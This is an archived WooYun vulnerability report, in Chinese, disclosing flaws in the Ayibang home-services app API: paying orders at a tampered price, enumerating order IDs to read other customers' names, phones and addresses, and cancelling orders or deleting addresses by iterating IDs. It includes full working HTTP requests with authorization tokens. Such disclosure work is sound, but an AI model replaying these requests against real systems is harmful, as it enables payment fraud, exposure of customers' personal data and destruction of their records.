{"id": 74647, "wybug_id": "wooyun-2016-0174347", "wybug_title": "阿姨帮最新版APP漏洞打包(支付漏洞/地址/订单遍历/删除等)", "wybug_corp": "ayibang.com", "wybug_author": "路人甲", "wybug_date": "2016-02-02 12:45", "wybug_open_date": "2016-02-20 21:50", "wybug_type": "敏感信息泄露", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-02-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-02-20：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 阿姨帮最新版APP(v6.2.0)漏洞打包 详细说明：  1.超低价格支付订单点击首页，随便选择一项服务并下订单\n\n\n\n点击确认支付抓包并先截断提交：\nPOST https://api-cust.ayibang.com/v1/pay/wx/sign HTTP/1.1User-Agent: {\"os\":\"4.4.2\",\"unique\":\"28552821044111528D2446FF003\",\"version-Code\":1012,\"version-Name\":\"6.2.0\",\"device\":\"M355\",\"sim-Operator\":\"UnKnown\",\"mac\":\"28D2446FF003\",\"type\":\"Android\",\"channel\":\"portal\"}Authorization: 30f6188161eb1a0bc7d245c49c01a208bb3cee34Network: WiFiCity: beijingTimestamp: 1452845167007Content-Type: application/x-www-form-urlencoded; charset=UTF-8Host: api-cust.ayibang.comConnection: Keep-AliveAccept-Encoding: gzipContent-Length: 128out_trade_no=11291191&attach=0_1_13800000000_0&body=%E9%98%BF%E5%A7%A8%E5%B8%AE%E6%94%AF%E4%BB%98&total_fee=5000&trade_type=APP&\n将上面的total_fee的值改为1，提交\n\n支付成功后订单成为待确认状态，说明支付成功\n\n2.任意用户订单查看点击我们刚生成的订单，系统访问如下地址：\nGET https://api-cust.ayibang.com/v1/order/detail?orderID=11291191 HTTP/1.1User-Agent: {\"os\":\"4.4.2\",\"unique\":\"28552821044111528D2446FF003\",\"version-Code\":1012,\"version-Name\":\"6.2.0\",\"device\":\"M355\",\"sim-Operator\":\"UnKnown\",\"mac\":\"28D2446FF003\",\"type\":\"Android\",\"channel\":\"portal\"}Authorization: 30f6188161eb1a0bc7d245c49c01a208bb3cee34Network: WiFiCity: beijingTimestamp: 1452845324989Host: api-cust.ayibang.comConnection: Keep-AliveAccept-Encoding: gzip\norderID=11291191处可遍历，burp出手对订单的后四位遍历\n\nN多订单信息可看\n\n以订单ID为11290071为例，可查看到该订单涉及用户的姓名 手机号 住址等\n\n3.任意用户订单取消漏洞点击之前的订单，点击取消订单，系统访问如下url:\nPOST https://api-cust.ayibang.com/v1/order/cancel HTTP/1.1User-Agent: {\"os\":\"4.4.2\",\"unique\":\"28552821044111528D2446FF003\",\"version-Code\":1012,\"version-Name\":\"6.2.0\",\"device\":\"M355\",\"sim-Operator\":\"UnKnown\",\"mac\":\"28D2446FF003\",\"type\":\"Android\",\"channel\":\"portal\"}Authorization: 30f6188161eb1a0bc7d245c49c01a208bb3cee34Network: WiFiCity: beijingTimestamp: 1452846770206Content-Type: application/x-www-form-urlencoded; charset=UTF-8Host: api-cust.ayibang.comConnection: Keep-AliveAccept-Encoding: gzipContent-Length: 42data=%7B%22orderID%22%3A%2211291191%22%7D&\npost处内容url解码后为：{\"orderID\":\"11291191\"}通过遍历orderID可删除所有订单通过另一手机注册一个账号并下一个订单\n\n抓包查得该订单ID为11292401提交以下代码：\nPOST https://api-cust.ayibang.com/v1/order/cancel HTTP/1.1User-Agent: {\"os\":\"4.4.2\",\"unique\":\"28552821044111528D2446FF003\",\"version-Code\":1012,\"version-Name\":\"6.2.0\",\"device\":\"M355\",\"sim-Operator\":\"UnKnown\",\"mac\":\"28D2446FF003\",\"type\":\"Android\",\"channel\":\"portal\"}Authorization: 30f6188161eb1a0bc7d245c49c01a208bb3cee34Network: WiFiCity: beijingTimestamp: 1452846770206Content-Type: application/x-www-form-urlencoded; charset=UTF-8Host: api-cust.ayibang.comConnection: Keep-AliveAccept-Encoding: gzipContent-Length: 42data=%7B%22orderID%22%3A%2211292401%22%7D&\n成功取消该订单\n\n再查看该用户订单列表，已经成为空：\n\n4.任意用户服务地址删除点击app里面服务地址:\n\n添加两个地址：\n\n然后删除上面的两个地址，并抓包：删除第一个地址请求数据包如下：\nGET https://api-cust.ayibang.com/v1/house/delete?houseID=17334752 HTTP/1.1User-Agent: {\"os\":\"4.4.2\",\"unique\":\"28552821044111528D2446FF003\",\"version-Code\":1012,\"version-Name\":\"6.2.0\",\"device\":\"M355\",\"sim-Operator\":\"UnKnown\",\"mac\":\"28D2446FF003\",\"type\":\"Android\",\"channel\":\"portal\"}Authorization: 211ebac721824b5cb688e3c6d1187bc21beff557Network: WiFiCity: nanjingTimestamp: 1452841496773Host: api-cust.ayibang.comConnection: Keep-AliveAccept-Encoding: gzip\n返回数据包如下：\nHTTP/1.1 200 OKServer: nginxDate: Fri, 15 Jan 2016 07:04:57 GMTContent-Type: application/jsonConnection: closeX-Powered-By: PHP/5.6.11Content-Length: 628{\"house\":{\"id\":\"17334752\",\"custID\":\"16989352\",\"city\":\"nanjing\",\"cityName\":\"\\u5357\\u4eac\",\"zone\":\"null\",\"nameAddr\":\"\\u5b9e\\u9a8c\\u6d4b\\u8bd5\\u4e2d\\u5fc3\",\"svcAddr\":\"\\u6c5f\\u82cf\\u7701\\u5357\\u4eac\\u5e02\\u4e2d\\u5c71\\u4e1c\\u8def534\\u53f7\",\"detailAddr\":\"\\u6d4b\\u8bd5\\u5730\\u5740\",\"sqmeter\":0,\"status\":-1,\"bedroom\":0,\"livingroom\":0,\"kitchen\":0,\"bathroom\":0,\"remark\":\"\",\"comment\":\"\",\"defaultaddr\":1,\"oid\":\"0\",\"type\":\"1\",\"locationAddr\":\"\\u5b9e\\u9a8c\\u6d4b\\u8bd5\\u4e2d\\u5fc3\\u6d4b\\u8bd5\\u5730\\u5740\",\"addr\":\"\\u5357\\u4eac\\u5b9e\\u9a8c\\u6d4b\\u8bd5\\u4e2d\\u5fc3\\u6d4b\\u8bd5\\u5730\\u5740\",\"statusName\":\"\\u5df2\\u5220\\u9664\",\"durationSuggest\":2}}\n上面内容解码后如下：\n\n可以看到statusName处标记为已删除，并且数据包返回的ID与删除的ID为同一ID：17334752再删除另外一个地址：\nGET https://api-cust.ayibang.com/v1/house/delete?houseID=17336562 HTTP/1.1User-Agent: {\"os\":\"4.4.2\",\"unique\":\"28552821044111528D2446FF003\",\"version-Code\":1012,\"version-Name\":\"6.2.0\",\"device\":\"M355\",\"sim-Operator\":\"UnKnown\",\"mac\":\"28D2446FF003\",\"type\":\"Android\",\"channel\":\"portal\"}Authorization: 211ebac721824b5cb688e3c6d1187bc21beff557Network: WiFiCity: nanjingTimestamp: 1452841783577Host: api-cust.ayibang.comConnection: Keep-AliveAccept-Encoding: gzip\n 由此可看到系统删除服务地址是根据不同的ID来实现的，虽然数字不是连续的，但是经过几次尝试发现都是以17开头的8位数字，如此遍可以通过遍历id删除其它用户的服务地址只需提交以下数据包：\nGET https://api-cust.ayibang.com/v1/house/delete?houseID=17336562 HTTP/1.1User-Agent: {\"os\":\"4.4.2\",\"unique\":\"28552821044111528D2446FF003\",\"version-Code\":1012,\"version-Name\":\"6.2.0\",\"device\":\"M355\",\"sim-Operator\":\"UnKnown\",\"mac\":\"28D2446FF003\",\"type\":\"Android\",\"channel\":\"portal\"}Authorization: 211ebac721824b5cb688e3c6d1187bc21beff557\n通过burpsuite 遍历houseID处，即可删除所有用户收获地址以下为我随便找的一个用户地址（抱歉给这位用户带来困扰）：\nGET https://api-cust.ayibang.com/v1/house/delete?houseID=17330512 HTTP/1.1Host: api-cust.ayibang.comConnection: keep-aliveCache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36 OPR/34.0.2036.47DNT: 1Accept-Encoding: gzip, deflate, lzma, sdchAccept-Language: zh-CN,zh;q=0.8\n返回：\n\n   漏洞证明：  如果需要通过浏览器复现上面问题，需要注意数据请求处有一个请求头：Authorization: 211ebac721824b5cb688e3c6d1187bc21beff557此处的authorization是用户在登录APP的时候服务器返回的认证key\n\n   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2016-02-20 21:50 厂商回复：  漏洞Rank：4  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}